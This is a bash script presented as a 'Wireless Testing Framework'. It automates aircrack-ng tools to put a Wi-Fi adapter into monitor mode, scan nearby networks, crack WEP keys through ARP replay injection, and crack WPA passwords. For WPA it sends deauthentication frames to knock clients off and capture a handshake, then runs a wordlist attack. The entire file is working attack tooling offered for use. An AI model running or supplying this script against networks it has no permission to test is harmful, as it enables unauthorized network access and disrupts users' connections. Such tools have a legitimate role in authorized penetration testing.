#!/usr/bin/env bash

# by Lee Baird @discoverscripts

set -euo pipefail

trap cleanup EXIT

# Global Variables
interface=""
monitor=""
pid_aireplay=""
pid_airodump=""
scanfile="$HOME/wtf-data/scan"
workdir="$HOME/wtf-data"

BLUE='\033[1;34m'
GREEN='\033[0;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

banner(){
    clear
    echo
    echo -e "${YELLOW}
__          __  _________   _________
\ \        / / |___   ___| |  _______|
 \ \  /\  / /      | |     | |____
  \ \/  \/ /       | |     |  ____|
   \  /\  /        | |     | |
    \/  \/         |_|     |_|

        Wireless Testing Framework

              By Lee Baird${NC}"
    echo
    echo
}

dependencies() {
    # Initialize an array to hold missing tools
    missing_tools=()

    # Check for tools
    for tool in aircrack-ng aireplay-ng airmon-ng airodump-ng xterm; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done

    # Display missing tools
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo
        echo -e "${RED}[!] Missing tools: ${missing_tools[*]}${NC}"
        echo
        exit 1
    fi

    echo -e "${BLUE}[*] Required tools installed.${NC}"

    # Check for wireless interface
    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)

    if [ -z "$interface" ]; then
        echo
        echo -e "${RED}[!] No wireless device found.${NC}"
        echo
        echo "Check if your wireless adapter is connected or enabled."
        echo
        exit 1
    fi
}

start_monitor_mode() {
    # Check for wireless interface
    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)

    if [ -z "$interface" ]; then
        echo
        echo -e "${RED}[!] No wireless device found.${NC}"
        echo
        echo "Check if your wireless adapter is connected or enabled."
        echo
        exit 1
    fi

    # Kill interfering processes (NetworkManager, wpa_supplicant)
    airmon-ng check kill

    echo -e "${BLUE}[*] Enabling monitor mode.${NC}"

    # Enable monitor mode on the interface
    airmon-ng start "$interface" | sed '/^$/d'

    # Wait to ensure the interface switches to monitor mode
    sleep 2

    # Check if the interface is in monitor
    mode=$(iwconfig "$interface" 2>/dev/null | grep "Mode:Monitor")

    if [ -z "$mode" ]; then
        echo
        echo -e "${RED}[!] Failed to enable monitor mode on interface: $interface.${NC}"
        echo
        exit 1
    else
        monitor="$interface"  # Keep using the same interface name
        echo -e "${BLUE}[*] Monitor mode enabled on interface:${NC} ${GREEN}$monitor${NC}"
    fi

    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

if [ ! -d "$workdir" ]; then
    mkdir -p "$workdir"
fi

scan_networks() {
    echo
    echo -e "${BLUE}[*] Scanning for wireless networks.${NC}"
    echo -e "${BLUE}[*] Using monitor interface:${NC} ${GREEN}$monitor${NC}"

    airodump-ng "$monitor" --output-format csv -w "$scanfile" &> "$workdir/airodump.log" &
    pid_airodump=$!

    # Increase the sleep time to capture more data
    sleep 10

    # Check if the process is still running before trying to kill it
    if kill -0 "$pid_airodump" &>/dev/null; then
        kill "$pid_airodump"
    else
        echo -e "${RED}[!] airodump-ng process is not running.${NC}"
    fi

    # Check if the scan file exists
    if [ -f "${scanfile}-01.csv" ]; then
        echo
        echo -e "${BLUE}[*] Scan complete. Data saved to ${scanfile}-01.csv.${NC}"
        echo
        echo -e "${YELLOW}[*] Displaying results:${NC}"
        awk -F, 'NR > 2 && $1 ~ /[0-9a-fA-F:]/ {print "BSSID: " $1, " | Channel: " $4, " | Encryption: " $6, " | ESSID: " $14}' "${scanfile}-01.csv" | column -t
    else
        echo
        echo -e "${RED}[!] No wireless networks found or failed to write data.${NC}"
        echo
        echo -e "${YELLOW}Check $workdir/airodump.log for errors.${NC}"
    fi
    
    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

crack_wep() {
    echo
    echo -e "${BLUE}[*] Running airodump-ng to find WEP targets.${NC}"
    airodump-ng --encrypt WEP "$monitor"
    echo
    echo -n "BSSID: "
    read -r bssid
    echo -n "Channel: "
    read -r channel
    echo -n "Client MAC address: "
    read -r client

    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo
        echo -e "${RED}[!] Missing data.${NC}"
        cleanup
    fi

    if [ -z "$client" ]; then
        client="ff:ff:ff:ff:ff:ff"
    fi

    xterm -e "airodump-ng $monitor --bssid $bssid --channel $channel --write wep_capture" &
    pid_airodump=$!
    sleep 5
    xterm -e "aireplay-ng $monitor --arpreplay -b $bssid -h $client" &
    pid_aireplay=$!

    echo
    echo -e "${BLUE}[*] Gathering data for WEP cracking.${NC}"
    sleep 60  # Capture data
    
    if aircrack-ng -b "$bssid" wep_capture*.cap; then
        echo
        echo -e "${YELLOW}[*] WEP cracked successfully.${NC}"
    else
        echo
        echo -e "${RED}[!] WEP cracking failed.${NC}"
        echo
        exit 1
    fi
}

crack_wpa() {
    echo
    echo -e "${BLUE}[*] Running airodump-ng to find WPA targets.${NC}"
    airodump-ng --encrypt WEP "$monitor"
    echo
    echo -n "BSSID: "
    read -r bssid
    echo -n "Channel: "
    read -r channel
    echo -n "Client MAC address: "
    read -r client

    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo
        echo -e "${RED}[!] Missing data.${NC}"
        cleanup
    fi

    xterm -e "airodump-ng $monitor --bssid $bssid --channel $channel --write wpa_capture" &
    pid_airodump=$!
    sleep 5
    xterm -e "aireplay-ng $monitor --deauth 10 -a $bssid" &
    pid_aireplay=$!

    echo
    echo -e "${BLUE}[*] Capturing handshake for WPA cracking.${NC}"
    sleep 60  # Capture handshake

    if ! aircrack-ng wpa_capture*.cap | grep -q "WPA handshake"; then
        echo
        echo -e "${RED}[!] No WPA handshake found.${NC}"
        cleanup
    fi

    echo
    echo -n "Enter the path to your wordlist: "
    read -r wordlist

    if [ -z "$wordlist" ]; then
        echo
        echo -e "${RED}[!] No data entered.${NC}"
        echo
        exit 1
    fi

    if [ ! -f "$wordlist" ]; then
        echo
        echo -e "${RED}[!] The file does not exist.${NC}"
        echo
        exit 1
    fi

    if aircrack-ng -w "$wordlist" wpa_capture*.cap; then
        echo
        echo -e "${YELLOW}[*] WPA cracked successfully.${NC}"
        cleanup
    else
        echo
        echo -e "${RED}[!] WPA cracking failed.${NC}"
        echo
        exit 1
    fi
}

cleanup() {
    # Reset PIDs after killing them
    if [ -n "${pid_airodump:-}" ]; then
        kill "$pid_airodump" &>/dev/null || true
        pid_airodump=""
    fi

    if [ -n "${pid_aireplay:-}" ]; then
        kill "$pid_aireplay" &>/dev/null || true
        pid_aireplay=""
    fi

    # Reset wireless interface
    airmon-ng stop $interface &>/dev/null

    echo
    echo
    echo -e "${BLUE}[*] Cleanup complete.${NC}"
    echo
    exit
}

main_menu() {
    echo -e "${BLUE}[*] Wireless interface:${NC} ${GREEN}$interface${NC}"

    while true; do
        echo
        echo "1. Enable monitor mode"
        echo "2. Scan for networks"
        echo "3. Crack WEP"
        echo "4. Crack WPA"
        echo "5. Exit"
        echo
        echo -n "Choice: "
        read -r choice

        case $choice in
            1) start_monitor_mode ;;
            2) scan_networks ;;
            3) crack_wep ;;
            4) crack_wpa ;;
            5) cleanup ;;
            *) echo; echo -e "${RED}[!] Invalid option, try again.${NC}"; echo; sleep 2;
               banner; main_menu ;;
        esac
    done
}

# Run the script
banner
dependencies
main_menu
